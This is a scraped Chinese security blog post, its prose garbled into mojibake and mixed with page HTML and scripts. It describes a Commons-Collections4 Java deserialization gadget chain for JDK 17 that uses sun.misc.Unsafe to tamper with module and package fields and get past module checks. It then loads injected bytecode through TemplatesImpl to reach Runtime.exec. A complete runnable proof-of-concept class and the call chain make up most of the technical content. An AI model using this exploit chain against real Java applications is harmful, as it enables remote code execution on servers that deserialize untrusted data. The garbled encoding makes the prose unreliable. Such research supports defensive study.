System.out.println(ObjectModule.getClass().getName()); // Class\u003c?\u003e TrAXFilter2 = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"); // System.out.println(\"222\"+TrAXFilter2.getPackageName()); // final Class\u003c?\u003e cls = input.getClass(); // final Method method = cls.getMethod(iMethodName, iParamTypes); // return (O) method.invoke(input, iArgs); // InvokerTransformer invokerTransformer4 = new InvokerTransformer(\"getAndSetObject\",new Class[]{Object.class,long.class,Object.class}, new Object[]{Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"),60,\"javax.xml\"}); InvokerTransformer invokerTransformer3 = new InvokerTransformer(\"get\",new Class[]{Object.class}, new Object[]{null}); InvokerTransformer invokerTransformer2 = new InvokerTransformer(\"setAccessible\",new Class[]{boolean.class}, new Object[]{true}); TransformerClosure transformerClosure = new TransformerClosure(invokerTransformer2); ClosureTransformer ClosureTransformer = new ClosureTransformer(transformerClosure); InvokerTransformer invokerTransformer = new InvokerTransformer(\"getDeclaredField\",new Class[]{String.class}, new Object[]{\"theUnsafe\"}); ConstantTransformer constantTransformer = new ConstantTransformer(UnsafeClass); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,ClosureTransformer,invokerTransformer3}; Transformer keyTransformer = new ChainedTransformer(transformers); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(keyTransformer); oos.close(); // ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡ FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); Transformer o1 = (Transformer) ois.readObject(); ois.close(); // System.out.println(Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\").getPackageName()); Object transform = o1.transform(null); System.out.println(transform); // System.out.println(Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\").getPackageName()); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } } 2.2 Module æœ¬ä»¥ä¸ºæœ€éš¾çš„é—®é¢˜å·²ç»è§£å†³äº†ï¼Œä½†æ˜¯åˆç”¨æ–°çš„é—®é¢˜äº†wwww\nåé¢å…¶å®å°±åªæ˜¯è°ƒç”¨unsafe.getAndSetObjectï¼Œä»–çš„å‚æ•°éƒ½å¯ä»¥ä¼ ç„¶åè°ƒç”¨ã€‚æ­£å½“æˆ‘è¿™ä¹ˆæƒ³çš„æ—¶å€™çªç„¶ä¸€é˜µä¸å¥½çš„é¢„æ„Ÿ\nunsafe.getAndSetObject(currentClass,addr,ObjectModule); è¿™é‡Œaddræ˜¯ä¸€ä¸ªlongå€¼ï¼Œå¯ä»¥ç›´æ¥ä¼ ï¼Œä½†æ˜¯ObjectModuleæ˜¯ä¸€ä¸ªModuleç±»å•Šï¼Œä¸èƒ½ååºåˆ—åŒ–ï¼Œè€Œä¸”ä¹Ÿä¸èƒ½é€šè¿‡å‰é¢çš„CCé“¾transformæ„é€ ï¼Œå› ä¸ºä½ æ„é€ å‡ºæ¥ä¹Ÿä¼ ä¸åˆ°å‚æ•°çš„åœ°æ–¹å§ï¼wwwï¼Œè¿™æˆªæ­¢æ¯”ä¸Šä¸€ä¸ªæ›´å¡æ­»ï¼Œç®€ç›´æ— è§£ï¼\n2.3 pn æ²¡åŠæ³•ï¼Œåªèƒ½æŠ±ç€æœ€åä¸€ä¸å¸Œæœ›å»çœ‹çœ‹newInstanceï¼Œæ˜¯æ€ä¹ˆè¿›è¡Œæ¨¡å—æ£€æµ‹çš„ï¼Œçœ‹èƒ½ä¸èƒ½é€šè¿‡å…¶ä»–æ–¹æ³•ç»•è¿‡\nç„¶åè°ƒè¯• è°ƒè¯• è°ƒè¯• å•Š å‘ç°èµ·åˆå°±æ˜¯è¿™ä¸ªåœ°æ–¹ç»™æˆ‘ä»¬return falseçš„\nå¾€ä¸‹çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿›è¡Œäº†æ¨¡å—æ¯”è¾ƒï¼Œä¸€æ ·çš„è¯ç›´æ¥å°±ä¼šè¿”å›true\nç„¶ååé¢ä¼šè¿›å»åˆ°Moduleç±»ï¼Œè¿™é‡Œè°ƒç”¨çš„æ˜¯è¢«è°ƒç”¨ç±»ï¼ˆTrAXFilterï¼‰çš„Module.isExported\nç„¶åè·Ÿåˆ°implIsExportedOrOpenï¼Œç„¶åå‘ç°äº†è¿™ä¸ªisNamed()ï¼Œè¿™é‡Œä»£ç æ„æ€æ˜¯è¢«è°ƒç”¨ç±»æ²¡æœ‰æ¨¡å—åå­—çš„è¯å°±ç›´æ¥è¿”å›true\né‚£ç®€å•å‘€ç”¨UnsafeæŠŠTrAXFilterçš„Module.nameæ”¹äº†ä¸ä¹…è¡Œäº†ï¼Œè¿™ä¸ªæƒ³æ³•æˆ‘èµ·åˆä¹Ÿè§‰å¾—å¿«æˆäº†ã€‚ä½†å…¶å®Moduleç±»åšäº†é˜²æŠ¤ï¼Œjavaä¸ä¼šè®©æˆ‘ä»¬å¾—åˆ°è¿™ä¸ªçš„ç±»Fieldã€‚getDeclaredFields()å‡ºæ¥éƒ½æ˜¯ç©ºçš„ã€‚\nç„¶åè¿˜æƒ³è¿‡èƒ½ä¸èƒ½ç›´æ¥æŠŠModuleè®¾ç½®æˆnullå‘€ï¼Œnullèƒ½ååºåˆ—åŒ–å‘€ï¼Œå…¶å®çº¯æ‰¯ï¼Œåœ¨è¿›å…¥isExportedæ–¹æ³•æ—¶å…¶å®å°±ä¼šæŠ¥ç©ºæŒ‡é’ˆé”™è¯¯ï¼\nç„¶åç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªiféƒ½æ²¡å¸Œæœ›çš„ï¼Œthis==otherçš„è¯å‰é¢ä»£ç å°±è¿”å›trueäº†ï¼Œç„¶åisOpen()æ˜¯false\né‚£åªæœ‰æœ€åç‚¹å¸Œæœ›å’¯ï¼Œè·Ÿè¿›isStaticallyExportedOrOpen\nä¸Šé¢é‚£ä¸ªifopenPackagesæ˜¯nullï¼Œæ ¹æœ¬æ“ä½œä¸äº†ï¼Œç„¶åçœ‹åˆ°ä¸‹é¢è¿™ä¸ªif\nè¿™ä¸ªexportedPackagesæ˜¯ä¸€ä¸ªHashmapï¼Œä¼šä»è¿™é‡Œé¢è·å–å€¼ï¼Œè¿˜è®°å¾—è¿™ä¸ªpnæ˜¯ä»€ä¹ˆï¼Œæ˜¯è¢«è°ƒç”¨ç±»çš„æ¨¡å—å(com.sun.org.apache.xalan.internal.xsltc.trax),æ­£å¸¸è¿™é‡Œæ˜¯æ²¡æœ‰å¯¹åº”çš„keyï¼Œè¿”å›nullçš„ã€‚\næˆ‘ä»¬è·Ÿè¿›allowsï¼Œwcï¼Œå‘ç°åªè¦targetsä¸ä¸ºnullï¼Œæ€ä¹ˆæ ·éƒ½è¿”å›trueå•Šå•Šå•Šå•Šï¼ˆä¸‹å›¾æ˜¯æˆ‘å·²ç»æ“ä½œè¿‡çš„ï¼Œtargetsä¼šæœ‰å€¼\nä¹Ÿå°±æ˜¯pnåªè¦æ˜¯exportedPackagesä¸­çš„ä»»æ„ä¸€ä¸ªkeyå€¼ä¸å°±è¡Œäº†ï¼Œæˆ‘ä»¬å†å›æƒ³ä¸‹pnæ€ä¹ˆæ¥çš„\nString pkg = memberClass.getPackageName();//pkgå°±æ˜¯pn return memberModule.isExported(pkg, currentModule); Class.classä¸­ public String getPackageName() { String pn = this.packageName; if (pn == null) { ... } return pn; } å¯ä»¥çœ‹åˆ°å°±æ˜¯Classç±»ä¸­packageNameå±æ€§ï¼Œè¿™è¿˜ä¸å®¹æ˜“ï¼Ÿï¼ŒClassç±»ä¸­moduleå±æ€§ï¼Œæˆ‘éƒ½èƒ½æ”¹ï¼Œè¿˜æ”¹ä¸ä½ äº†ï¼Ÿ\nç›´æ¥ç”¨Unsafeä¿®æ”¹äº†packageName\n0x04 poc å¿ƒå¿ƒå¿µå¿µçš„pocå‘œå‘œå‘œ\n//import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; //import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.*; import sun.misc.Unsafe; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.PriorityQueue; public class CC4_17 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); ClassLoader appClassLoader = ClassLoader.getSystemClassLoader(); pool.insertClassPath(new javassist.LoaderClassPath(appClassLoader)); CtClass clazz = pool.get(\"eval\"); byte[] code = clazz.toBytecode(); CtClass clazz2 = pool.get(Evil.class.getName());//è¿™é‡Œéšä¾¿ä¸€ä¸ªç±»å°±è¡Œï¼Œcode2å‡‘æ•°ç”¨çš„ byte[] code2 = clazz2.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); Class\u003c?\u003e aClass = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); patchModule(CC4_17.class,aClass); Object templates = aClass.getDeclaredConstructor().newInstance(); setFiled(templates,\"_name\",\"111\"); setFiled(templates,\"_bytecodes\",new byte[][]{code,code2}); setFiled(templates,\"_transletIndex\",0); Class\u003c?\u003e TrAXFilter = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"); InstantiateTransformer invokerTransformer5 = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); ConstantTransformer constantTransformer2 = new ConstantTransformer(TrAXFilter); InvokerTransformer invokerTransformer4 = new InvokerTransformer(\"getAndSetObject\",new Class[]{Object.class,long.class,Object.class}, new Object[]{Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"),60,\"javax.xml\"}); InvokerTransformer invokerTransformer3 = new InvokerTransformer(\"get\",new Class[]{Object.class}, new Object[]{null}); InvokerTransformer invokerTransformer2 = new InvokerTransformer(\"setAccessible\",new Class[]{boolean.class}, new Object[]{true}); TransformerClosure transformerClosure = new TransformerClosure(invokerTransformer2); ClosureTransformer ClosureTransformer = new ClosureTransformer(transformerClosure); InvokerTransformer invokerTransformer = new InvokerTransformer(\"getDeclaredField\",new Class[]{String.class}, new Object[]{\"theUnsafe\"}); ConstantTransformer constantTransformer = new ConstantTransformer(Class.forName(\"sun.misc.Unsafe\")); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,ClosureTransformer,invokerTransformer3,invokerTransformer4,constantTransformer2,invokerTransformer5}; Transformer keyTransformer = new ChainedTransformer(transformers); // patchModule(invokerTransformer.getClass(),aClass); System.out.println(TrAXFilter.getModule().getName()); System.out.println(invokerTransformer.getClass().getModule().getName()); TransformingComparator transformingComparator = new TransformingComparator(keyTransformer); PriorityQueue priorityQueue = new PriorityQueue(2,transformingComparator); patchModule(CC4_17.class,priorityQueue.getClass()); Field size = priorityQueue.getClass().getDeclaredField(\"size\"); size.setAccessible(true); size.setInt(priorityQueue, 2); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(priorityQueue); oos.close(); // ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡ FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } è°ƒç”¨é“¾ PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ---\u003e è¿™é‡Œå¼€å§‹æ„é€ Unsafeå¯¹è±¡ï¼Œå¾—åˆ°Filedå¯¹è±¡ ClosureTransformer.transform() ---\u003e è¿™é‡Œå½¢æˆä¸€ä¸ªå²”è·¯ï¼Œå»æ„é€ setAccessible TransformerClosure.transform() InvokerTransformer.transform() ---\u003e è¿™é‡Œæ‰§è¡ŒsetAccessibleï¼Œç„¶ååˆå›åˆ°ä¸»çº¿ InvokerTransformer.transform() ---\u003e æ‰§è¡Œget()ï¼Œå¾—åˆ°Unsafeå¯¹è±¡ InvokerTransformer.transform()\t---\u003e æ‰§è¡ŒgetAndSetObjectï¼Œä¿®æ”¹pn ConstantTransformer.transform() ---\u003eè¿™é‡Œå›åˆ°æ­£å¸¸CC4é“¾å­ InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() 0x05 é—æ¼ å†™æ–‡ç« çš„æ—¶å€™çœ‹ä»£ç è¶Šçœ‹è¶Šæ„Ÿè§‰æ¼æ‰äº†ä»€ä¹ˆï¼Œè¿˜è®°å¾—æˆ‘å‰é¢è¯´åˆ°çš„ä¸€ä¸ªåˆ©ç”¨å°è¯•\"null\"ï¼Œè¿™ä¸ªåœ°æ–¹æˆ‘åˆ†æçš„æ—¶å€™ï¼ŒæŠŠmemberClassæƒ³æˆnulläº†ï¼Œå…¶å®ä¸æ˜¯ï¼Œæ˜¯memberClass.getModule()ä¸ºnull\né‚£ä¹ˆæœ‰ç‚¹æ„Ÿè§‰äº†ä¹ˆå°‘å¹´ï¼Ÿæˆ‘tmç›´æ¥æŠŠè¿™ä¸¤ä¸ªçš„Moudleéƒ½ç”¨Unsafeæ”¹æˆnullå‘—ï¼Œç»è¿‡ä¿ºçš„æ”¹é€ ï¼ŒUnsafeå¯¹è±¡è°ƒç”¨ä¸¤æ¬¡å®Œå…¨ä¸æ˜¯é—®é¢˜å•Š\næ„Ÿè§‰æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯æˆ‘æ‡’ï¼Œä¿ºè¦å»åƒé¥­äº†ï¼Œéƒ½9ç‚¹äº†æ‰å†™å®Œï¼ï¼\n",
  "wordCount" : "6215",
  "inLanguage": "zh",
  "datePublished": "2025-01-10T20:01:23+08:00",
  "dateModified": "2025-01-10T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      jdk17&amp;CCé“¾ä¸‹åˆ©ç”¨TemplatesImpl
    </h1>
    <div class="post-meta"><span title='2025-01-10 20:01:23 +0800 CST'>2025-01-10</span>&nbsp;Â·&nbsp;13 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#0x01-%e5%89%8d%e8%a8%80" aria-label="0x01 å‰è¨€">0x01 å‰è¨€</a><ul>
                            
                    <li>
                        <a href="#%e7%8e%af%e5%a2%83" aria-label="ç¯å¢ƒ"><strong>ç¯å¢ƒ</strong></a></li></ul>
                    </li>
                    <li>
                        <a href="#0x02-%e5%88%9d%e8%a7%81%e7%ab%af%e5%80%aa" aria-label="0x02 åˆè§ç«¯å€ª">0x02 åˆè§ç«¯å€ª</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#templatesimpl-test" aria-label="TemplatesImpl test">TemplatesImpl test</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#0x03-%e6%9e%84%e9%80%a0" aria-label="0x03 æ„é€ ">0x03 æ„é€ </a><ul>
                            <ul>
                            
                    <li>
                        <a href="#1evalclass" aria-label="1.eval.class">1.eval.class</a></li></ul>
                        
                    <li>
                        <a href="#2-boss-newinstance" aria-label="2. boss newInstance">2. boss newInstance</a><ul>
                            
                    <li>
                        <a href="#21-%e6%80%8e%e4%b9%88%e5%ae%9e%e7%8e%b0unsafe" aria-label="2.1 æ€ä¹ˆå®ç°Unsafe">2.1 æ€ä¹ˆå®ç°Unsafe</a><ul>
                            
                    <li>
                        <a href="#%e5%b0%9d%e8%af%95" aria-label="å°è¯•"><strong>å°è¯•</strong></a></li>
                    <li>
                        <a href="#%e8%a7%a3%e5%86%b3" aria-label="è§£å†³"><strong>è§£å†³</strong></a><ul>
                            
                    <li>
                        <a href="#%e6%89%be%e5%88%b0%e7%9a%84%e4%b8%80%e4%ba%9b%e7%b1%bb" aria-label="æ‰¾åˆ°çš„ä¸€äº›ç±»">æ‰¾åˆ°çš„ä¸€äº›ç±»</a></li>
                    <li>
                        <a href="#%e6%af%94%e8%be%83%e5%a5%bd%e7%94%a8%e7%9a%84" aria-label="æ¯”è¾ƒå¥½ç”¨çš„">æ¯”è¾ƒå¥½ç”¨çš„</a></li>
                    <li>
                        <a href="#demo" aria-label="demo">demo</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#22-module" aria-label="2.2 Module">2.2 Module</a></li>
                    <li>
                        <a href="#23-pn" aria-label="2.3 pn">2.3 pn</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#0x04-poc" aria-label="0x04 poc">0x04 poc</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e8%b0%83%e7%94%a8%e9%93%be" aria-label="è°ƒç”¨é“¾">è°ƒç”¨é“¾</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#0x05-%e9%81%97%e6%bc%8f" aria-label="0x05 é—æ¼">0x05 é—æ¼</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h1 id="0x01-å‰è¨€">0x01 å‰è¨€<a hidden class="anchor" aria-hidden="true" href="#0x01-å‰è¨€">#</a></h1>
<blockquote>
<p>èµ·å› çœ‹åˆ°ä¸€ç¯‡æ–‡ç« è¯´jdk17å› ä¸º<code>å¼ºå°è£…ï¼ˆæ¨¡å—åŒ–ï¼‰</code>ï¼Œåˆ©ç”¨ä¸äº†<code>TemplatesImpl</code>æ¥ä½œä¸ºååºåˆ—åŒ–çš„sinkç‚¹äº†ï¼Œäºæ˜¯å»è¯•äº†ä¸‹ã€‚èµ·åˆå…ˆå†™äº†ä¸ªå°demoï¼Œå‘ç°å¯ä»¥è°ƒç”¨å‘€ï¼Œç„¶åå°±æƒ³æä¸€æ¡å®Œæ•´çš„é“¾å­ï¼Œç„¶åè¿™é‡Œé€‰æ‹©çš„æ˜¯CC4ï¼Œå› ä¸ºä»–æœ€åsinkç‚¹å°±æ˜¯<code>TemplatesImpl</code>,å½“ç„¶CC6ï¼ŒCC7ï¼ŒCC5æ”¹æ”¹åº”è¯¥ä¹Ÿå¯ä»¥ï¼ˆCC5èµ·ç‚¹ä¹Ÿè¦æ¢ï¼‰ï¼Œä½†æ˜¯æˆ‘æ‡’å°±ç›´æ¥ç”¨CC4äº†ã€‚åœ¨jdk17 <code>Module</code>æ¨¡å¼ä¸‹ï¼ŒCC6å¯ä»¥ç›´æ¥å¥—ä¸€å±‚Unsafeå°±èƒ½ç›´æ¥rceäº†ï¼Œä½†æ˜¯å®ç°<code>åŠ è½½å­—èŠ‚ç </code>å¯ä»¥åšæ›´å¤šäº‹ï¼Œäºæ˜¯ä¿ºç ”ç©¶äº†ä¸‹ï¼Œä¹Ÿæ˜¯è§£å†³é‡é‡å›°éš¾å®ç°äº†æœ€åçš„åˆ©ç”¨ï¼</p>
</blockquote>
<h2 id="ç¯å¢ƒ"><strong>ç¯å¢ƒ</strong><a hidden class="anchor" aria-hidden="true" href="#ç¯å¢ƒ">#</a></h2>
<ul>
<li>jdk17.0.8</li>
<li>pom.xml</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependencies&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.12.1.GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.commons<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>commons-collections4<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>4.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependencies&gt;</span>
</span></span></code></pre></div><p><strong>jdk17 æ¨¡å—æ£€æµ‹</strong></p>
<blockquote>
<p>æ—©åœ¨jdk9å°±å¼€å§‹äº†<code>æ¨¡å—åŒ–</code>ï¼Œä½†æ˜¯çœŸæ­£å®æ–½æ˜¯åœ¨jdk17ã€‚<code>æ¨¡å—åŒ–</code>ç®€å•ç†è§£å°†å°±æ˜¯ javaä¸ºäº†å®‰å…¨æœ‰ä¸€äº›ç±»ä¸æƒ³è®©ä½ ç›´æ¥è°ƒç”¨ï¼Œä½†æ˜¯javaæ¨¡å—é‡Œé¢çš„ç±»åˆéœ€è¦ç›¸äº’è°ƒç”¨ï¼Œæ‰€ä»¥<code>åå°„</code>å’Œ<code>newä¸€ä¸ªå¯¹è±¡</code>çš„æ—¶å€™ä¼šå¯¹<code>è°ƒç”¨ç±»</code>å’Œ<code>è¢«è°ƒç”¨ç±»</code>è¿›è¡Œä¸€ä¸ª<code>æ¨¡å—æ£€æµ‹</code>ï¼ˆè¿™é‡Œä¸åªæ˜¯æ£€æµ‹è°ƒç”¨å’Œè¢«è°ƒç”¨ç±»çš„<code>æ¨¡å—å…³ç³»</code>ï¼Œè¿˜æœ‰å…¶ä»–åˆ¤æ–­ï¼‰ï¼Œå¥½è¿™é‡Œæˆ‘ä»¬å¤§æ¦‚æœ‰ä¸ªæ¦‚å¿µï¼Œjdk17 ä¼šè¿›è¡Œ<code>æ¨¡å—æ£€æµ‹</code></p>
</blockquote>
<h1 id="0x02-åˆè§ç«¯å€ª">0x02 åˆè§ç«¯å€ª<a hidden class="anchor" aria-hidden="true" href="#0x02-åˆè§ç«¯å€ª">#</a></h1>
<p>å…ˆæ¥çœ‹ä¸ªå°demoï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°<code>Unsafe</code>ï¼Œä¸æ‡‚çš„åŒå­¦å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ªï¼Œç®€å•è¯´<code>Unsafe</code>è¿™é‡Œæ˜¯ç”¨æ¥<code>ä¿®æ”¹æˆ‘ä»¬è°ƒç”¨ç±»çš„æ¨¡å—</code>ï¼Œä»è€Œç»•è¿‡æ¨¡å—æ£€æµ‹ã€‚</p>
